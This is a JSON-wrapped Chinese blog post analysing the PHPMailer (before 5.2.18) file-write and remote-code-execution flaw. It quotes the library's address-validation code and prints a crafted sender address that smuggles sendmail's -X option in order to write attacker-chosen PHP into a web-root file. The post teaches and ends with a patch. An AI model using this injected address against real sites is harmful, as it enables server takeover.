'(?&gt;(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}' .\n                '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:' .\n                '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?9)){3}))\\])(?1)$/isD',\n                $address\n            );\n        case 'pcre':\n            //An older regex that doesn't need a recent PCRE\n            return (boolean)preg_match(\n                '/^(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){255,})(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){65,}@)(?&gt;' .\n                '[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\")' .\n                '(?&gt;\\.(?&gt;[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\"))*' .\n                '@(?&gt;(?![a-z0-9-]{64,})(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\\.(?![a-z0-9-]{64,})' .\n                '(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]{1,4})(?&gt;:' .\n                '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\\]]){8,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?' .\n                '::(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]{1,4}(?&gt;:' .\n                '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4})?' .\n                '::(?&gt;(?:[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4}):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\\])$/isD',\n                $address\n            );\n        case 'html5':\n            /**\n             * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.\n             * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)\n             */\n            return (boolean)preg_match(\n                '/^[a-zA-Z0-9.!#$%&amp;\\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .\n                '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',\n                $address\n            );\n        case 'noregex':\n            //No PCRE! Do something _very_ approximate!\n            //Check the address is 3 chars or longer and contains an @ that's not the first or last char\n            return (strlen($address) &gt;= 3\n                and strpos($address, '@') &gt;= 1\n                and strpos($address, '@') != strlen($address) - 1);\n        case 'php':\n        default:\n            return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);\n    }\n}\n</pre>\n\n现在大多都采取'pcre8'方式进行过滤，所以我们的$address必须成功的通过过滤才可以赋值给$this-&gt;Sender.。\n\n目前已经有研究员构造出可以通过正则过滤的$address结构\n\n<pre class=\"lang:default decode:true \">xxx( -X/var/www/test.php )@qq.com</pre>\n\n这种结构的$address可以顺利的绕过pcre8正则的检测，接着在程序调用mail发送邮件时，$params参数成功的被拼接成“-fxxx( -X/var/www/success.php )@qq.com”作为额外参数传递给sendmail。在sendmail参数中 –X参数的作用是指定写入log的文件路径，具体描述如下图所示。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6-300x43.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6.jpg)\n\n## 漏洞利用\n\n漏洞利用的前提是目标站点的web应用必须使用phpmailer函数包，并开启邮件发送功能，这时攻击者可以将构造好的$address（及发送者地址）填入相应表单位置，然后将php指令填写到邮件内容中，如果web应用没有相应的过滤，则可以成功触发phpmailer，将php代码作为日志写入指定的文件中去。\n\n## 修补防御\n\n升级phpmailer至最新版本。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169\n直接询问：010-68438880","source":"_posts/PHPMailer-RCE.md","raw":"---\ntitle: PHPMailer漏洞分析\ndate: 2018-04-8 15:09:22\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n在PHPMailer 5.2.17以及之前版本中，存在着一个高危的任意文件写入漏洞，当攻击者将精心构造的恶意数据分别写入邮件内容以及发件人地址中并传递给使用了相应版本的PHPMailer web应用，就可以导致任意文件写入以及远程代码执行的攻击。<!--more-->\n\n## 影响版本\n\n[PHPMailer &lt; 5.2.18](http://www.baidu.com/link?url=um6oV6dGXX7qAxkU0jIKSwL3xMM0BpZpD_zFniLaJthbs_1A76kSswhsePrMssodFVaf0LrTQgKMY4_CvUV5QK)\n\n## 漏洞分析\n\n在正式的漏洞分析开始前，先来简单介绍下什么是phpmailer。\n\nPHPMailer是一个用于发送电子邮件的php函数包。有的读者会提问，既然php本身提供了一个用于发送邮件的mail函数，通过这个函数可以直接在程序中发送邮件，那么为什么需要PHPMailer呢？\n\nMail函数的语法如下：mail(to,subject,message,headers,parameters)，可见mail函数没法指定一台中继邮件发送服务器（及下图step2中的MDA）的功能，Mail函数需要服务器支持sendmail邮件传输代理程序。除此之外mail()函数也存在着一些其他功能上的不足，因此功能更加强大的PHPMailer函数包便诞生了。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1-300x221.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1.jpg)\n\n对本次漏洞，先看一下官方有什么改动，可以通过改动来推断出漏洞存在的原因。\n\n如下图所示，本次修复对class.phpmailer.php文件中的mailSend函数进行了改动，函数中的Sender参数进行了过滤。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2-300x86.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2.jpg)\n\n从上图可以看到，这个mailSend函数会将Sender参数处理后赋值给$params变量，当看到$params这个变量时，一些有经验的读者会想到mail函数第五个参数漏洞！的确没错，这个$params参数最终的确传给了mail函数，如下两张图所示。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3-300x297.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3.jpg)\n\n也就是说，我们可以通过控制Sender参数的传入，来构造$params参数，从而利用mail函数的一些特性写入后门文件。\n\n既然我们已经确定Sender参数为罪魁祸首，接下来我们追踪如何从外部传入并且控制Sender参数，如下图所示，我们追踪到setFrom函数。在这里，$address的值被赋予$Sender。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4-300x190.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4.jpg)\n\n这里的$address就是PHPMailer所提供的用来接收邮件发送方地址的参数。在$address赋值给$Sender之前，需要经历一次过滤，如下图所示\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5-300x121.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5.jpg)\n\n如上图所示，不能让红色框里的if语句判定成立，如果成立了，直接return false了，if条件的结构可以简化为(a or (b or c) and d)，在这里我们要确保$this-&gt;validateAddress($address)为真，才可以避免return false的结局，接下来看一下$this-&gt;validateAddress($address)中的代码。\n\n<pre class=\"lang:default decode:true \">public static function validateAddress($address, $patternselect = null)\n{\n    if (is_null($patternselect)) {\n        $patternselect = self::$validator;\n    }\n    if (is_callable($patternselect)) {\n        return call_user_func($patternselect, $address);\n    }\n    //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321\n    if (strpos($address, \"\\n\") !== false or strpos($address, \"\\r\") !== false) {\n        return false;\n    }\n    if (!$patternselect or $patternselect == 'auto') {\n        //Check this constant first so it works when extension_loaded() is disabled by safe mode\n        //Constant was added in PHP 5.2.4\n        if (defined('PCRE_VERSION')) {\n            //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2\n            if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) {\n                $patternselect = 'pcre8';\n            } else {\n                $patternselect = 'pcre';\n            }\n        } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {\n            //Fall back to older PCRE\n            $patternselect = 'pcre';\n        } else {\n            //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension\n            if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) {\n                $patternselect = 'php';\n            } else {\n                $patternselect = 'noregex';\n            }\n        }\n    }\n    switch ($patternselect) {\n        case 'pcre8':\n            /**\n             * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.\n             * @link http://squiloople.com/2009/12/20/email-address-validation/\n             * @copyright 2009-2010 Michael Rushton\n             * Feel free to use and redistribute this code. But please keep this copyright notice.\n             */\n            return (boolean)preg_match(\n                '/^(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){255,})(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){65,}@)' .\n                '((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\\x0D\\x0A)?[\\t ])+|(?&gt;[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?&gt;(?2)' .\n                '(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-\\'*-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' .\n                '([!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?2)(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]))*' .\n                '(?2)\")(?&gt;(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)' .\n                '(?&gt;(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}' .\n                '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:' .\n                '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?9)){3}))\\])(?1)$/isD',\n                $address\n            );\n        case 'pcre':\n            //An older regex that doesn't need a recent PCRE\n            return (boolean)preg_match(\n                '/^(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){255,})(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){65,}@)(?&gt;' .\n                '[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\")' .\n                '(?&gt;\\.(?&gt;[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\"))*' .\n                '@(?&gt;(?![a-z0-9-]{64,})(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\\.(?![a-z0-9-]{64,})' .\n                '(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]{1,4})(?&gt;:' .\n                '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\\]]){8,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?' .\n                '::(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]{1,4}(?&gt;:' .\n                '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4})?' .\n                '::(?&gt;(?:[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4}):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\\])$/isD',\n                $address\n            );\n        case 'html5':\n            /**\n             * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.\n             * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)\n             */\n            return (boolean)preg_match(\n                '/^[a-zA-Z0-9.!#$%&amp;\\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .\n                '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',\n                $address\n            );\n        case 'noregex':\n            //No PCRE! Do something _very_ approximate!\n            //Check the address is 3 chars or longer and contains an @ that's not the first or last char\n            return (strlen($address) &gt;= 3\n                and strpos($address, '@') &gt;= 1\n                and strpos($address, '@') != strlen($address) - 1);\n        case 'php':\n        default:\n            return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);\n    }\n}\n</pre>\n\n现在大多都采取'pcre8'方式进行过滤，所以我们的$address必须成功的通过过滤才可以赋值给$this-&gt;Sender.。\n\n目前已经有研究员构造出可以通过正则过滤的$address结构\n\n<pre class=\"lang:default decode:true \">xxx( -X/var/www/test.php )@qq.com</pre>\n\n这种结构的$address可以顺利的绕过pcre8正则的检测，接着在程序调用mail发送邮件时，$params参数成功的被拼接成“-fxxx( -X/var/www/success.php )@qq.com”作为额外参数传递给sendmail。在sendmail参数中 –X参数的作用是指定写入log的文件路径，具体描述如下图所示。\n\n[![](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6-300x43.jpg)](http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6.jpg)\n\n## 漏洞利用\n\n漏洞利用的前提是目标站点的web应用必须使用phpmailer函数包，并开启邮件发送功能，这时攻击者可以将构造好的$address（及发送者地址）填入相应表单位置，然后将php指令填写到邮件内容中，如果web应用没有相应的过滤，则可以成功触发phpmailer，将php代码作为日志写入指定的文件中去。\n\n## 修补防御\n\n升级phpmailer至最新版本。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169\n直接询问：010-68438880","slug":"PHPMailer-RCE","published":1,"updated":"2020-10-27T09:27:09.683Z","_id":"ckgrozu8k0012wsa9gr6yc9np","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在PHPMailer 5.2.17以及之前版本中，存在着一个高危的任意文件写入漏洞，当攻击者将精心构造的恶意数据分别写入邮件内容以及发件人地址中并传递给使用了相应版本的PHPMailer web应用，就可以导致任意文件写入以及远程代码执行的攻击。<a id=\"more\"></a></p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p><a href=\"http://www.baidu.com/link?url=um6oV6dGXX7qAxkU0jIKSwL3xMM0BpZpD_zFniLaJthbs_1A76kSswhsePrMssodFVaf0LrTQgKMY4_CvUV5QK\">PHPMailer &lt; 5.2.18</a></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在正式的漏洞分析开始前，先来简单介绍下什么是phpmailer。</p>\n<p>PHPMailer是一个用于发送电子邮件的php函数包。有的读者会提问，既然php本身提供了一个用于发送邮件的mail函数，通过这个函数可以直接在程序中发送邮件，那么为什么需要PHPMailer呢？</p>\n<p>Mail函数的语法如下：mail(to,subject,message,headers,parameters)，可见mail函数没法指定一台中继邮件发送服务器（及下图step2中的MDA）的功能，Mail函数需要服务器支持sendmail邮件传输代理程序。除此之外mail()函数也存在着一些其他功能上的不足，因此功能更加强大的PHPMailer函数包便诞生了。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1-300x221.jpg\"></a></p>\n<p>对本次漏洞，先看一下官方有什么改动，可以通过改动来推断出漏洞存在的原因。</p>\n<p>如下图所示，本次修复对class.phpmailer.php文件中的mailSend函数进行了改动，函数中的Sender参数进行了过滤。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2-300x86.jpg\"></a></p>\n<p>从上图可以看到，这个mailSend函数会将Sender参数处理后赋值给$params变量，当看到$params这个变量时，一些有经验的读者会想到mail函数第五个参数漏洞！的确没错，这个$params参数最终的确传给了mail函数，如下两张图所示。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3-300x297.jpg\"></a></p>\n<p>也就是说，我们可以通过控制Sender参数的传入，来构造$params参数，从而利用mail函数的一些特性写入后门文件。</p>\n<p>既然我们已经确定Sender参数为罪魁祸首，接下来我们追踪如何从外部传入并且控制Sender参数，如下图所示，我们追踪到setFrom函数。在这里，$address的值被赋予$Sender。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4-300x190.jpg\"></a></p>\n<p>这里的$address就是PHPMailer所提供的用来接收邮件发送方地址的参数。在$address赋值给$Sender之前，需要经历一次过滤，如下图所示</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5-300x121.jpg\"></a></p>\n<p>如上图所示，不能让红色框里的if语句判定成立，如果成立了，直接return false了，if条件的结构可以简化为(a or (b or c) and d)，在这里我们要确保$this-&gt;validateAddress($address)为真，才可以避免return false的结局，接下来看一下$this-&gt;validateAddress($address)中的代码。</p>\n<pre class=\"lang:default decode:true \">public static function validateAddress($address, $patternselect = null)\n{\n    if (is_null($patternselect)) {\n        $patternselect = self::$validator;\n    }\n    if (is_callable($patternselect)) {\n        return call_user_func($patternselect, $address);\n    }\n    //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321\n    if (strpos($address, \"\\n\") !== false or strpos($address, \"\\r\") !== false) {\n        return false;\n    }\n    if (!$patternselect or $patternselect == 'auto') {\n        //Check this constant first so it works when extension_loaded() is disabled by safe mode\n        //Constant was added in PHP 5.2.4\n        if (defined('PCRE_VERSION')) {\n            //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2\n            if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) {\n                $patternselect = 'pcre8';\n            } else {\n                $patternselect = 'pcre';\n            }\n        } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {\n            //Fall back to older PCRE\n            $patternselect = 'pcre';\n        } else {\n            //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension\n            if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) {\n                $patternselect = 'php';\n            } else {\n                $patternselect = 'noregex';\n            }\n        }\n    }\n    switch ($patternselect) {\n        case 'pcre8':\n            /**\n             * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.\n             * @link http://squiloople.com/2009/12/20/email-address-validation/\n             * @copyright 2009-2010 Michael Rushton\n             * Feel free to use and redistribute this code. But please keep this copyright notice.\n             */\n            return (boolean)preg_match(\n                '/^(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){255,})(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){65,}@)' .\n                '((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\\x0D\\x0A)?[\\t ])+|(?&gt;[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?&gt;(?2)' .\n                '(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-\\'*-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' .\n                '([!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?2)(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]))*' .\n                '(?2)\")(?&gt;(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)' .\n                '(?&gt;(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}' .\n                '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:' .\n                '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?9)){3}))\\])(?1)$/isD',\n                $address\n            );\n        case 'pcre':\n            //An older regex that doesn't need a recent PCRE\n            return (boolean)preg_match(\n                '/^(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){255,})(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){65,}@)(?&gt;' .\n                '[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\")' .\n                '(?&gt;\\.(?&gt;[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\"))*' .\n                '@(?&gt;(?![a-z0-9-]{64,})(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\\.(?![a-z0-9-]{64,})' .\n                '(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]{1,4})(?&gt;:' .\n                '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\\]]){8,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?' .\n                '::(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]{1,4}(?&gt;:' .\n                '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4})?' .\n                '::(?&gt;(?:[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4}):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\\])$/isD',\n                $address\n            );\n        case 'html5':\n            /**\n             * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.\n             * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)\n             */\n            return (boolean)preg_match(\n                '/^[a-zA-Z0-9.!#$%&amp;\\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .\n                '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',\n                $address\n            );\n        case 'noregex':\n            //No PCRE! Do something _very_ approximate!\n            //Check the address is 3 chars or longer and contains an @ that's not the first or last char\n            return (strlen($address) &gt;= 3\n                and strpos($address, '@') &gt;= 1\n                and strpos($address, '@') != strlen($address) - 1);\n        case 'php':\n        default:\n            return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);\n    }\n}\n</pre>\n\n<p>现在大多都采取’pcre8’方式进行过滤，所以我们的$address必须成功的通过过滤才可以赋值给$this-&gt;Sender.。</p>\n<p>目前已经有研究员构造出可以通过正则过滤的$address结构</p>\n<pre class=\"lang:default decode:true \">xxx( -X/var/www/test.php )@qq.com</pre>\n\n<p>这种结构的$address可以顺利的绕过pcre8正则的检测，接着在程序调用mail发送邮件时，$params参数成功的被拼接成“-fxxx( -X/var/www/success.php )@qq.com”作为额外参数传递给sendmail。在sendmail参数中 –X参数的作用是指定写入log的文件路径，具体描述如下图所示。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6-300x43.jpg\"></a></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>漏洞利用的前提是目标站点的web应用必须使用phpmailer函数包，并开启邮件发送功能，这时攻击者可以将构造好的$address（及发送者地址）填入相应表单位置，然后将php指令填写到邮件内容中，如果web应用没有相应的过滤，则可以成功触发phpmailer，将php代码作为日志写入指定的文件中去。</p>\n<h2 id=\"修补防御\"><a href=\"#修补防御\" class=\"headerlink\" title=\"修补防御\"></a>修补防御</h2><p>升级phpmailer至最新版本。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169<br>直接询问：010-68438880</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/拖库1.jpg","excerpt":"<p>在PHPMailer 5.2.17以及之前版本中，存在着一个高危的任意文件写入漏洞，当攻击者将精心构造的恶意数据分别写入邮件内容以及发件人地址中并传递给使用了相应版本的PHPMailer web应用，就可以导致任意文件写入以及远程代码执行的攻击。","more":"</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p><a href=\"http://www.baidu.com/link?url=um6oV6dGXX7qAxkU0jIKSwL3xMM0BpZpD_zFniLaJthbs_1A76kSswhsePrMssodFVaf0LrTQgKMY4_CvUV5QK\">PHPMailer &lt; 5.2.18</a></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在正式的漏洞分析开始前，先来简单介绍下什么是phpmailer。</p>\n<p>PHPMailer是一个用于发送电子邮件的php函数包。有的读者会提问，既然php本身提供了一个用于发送邮件的mail函数，通过这个函数可以直接在程序中发送邮件，那么为什么需要PHPMailer呢？</p>\n<p>Mail函数的语法如下：mail(to,subject,message,headers,parameters)，可见mail函数没法指定一台中继邮件发送服务器（及下图step2中的MDA）的功能，Mail函数需要服务器支持sendmail邮件传输代理程序。除此之外mail()函数也存在着一些其他功能上的不足，因此功能更加强大的PHPMailer函数包便诞生了。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1.jpg\"><img 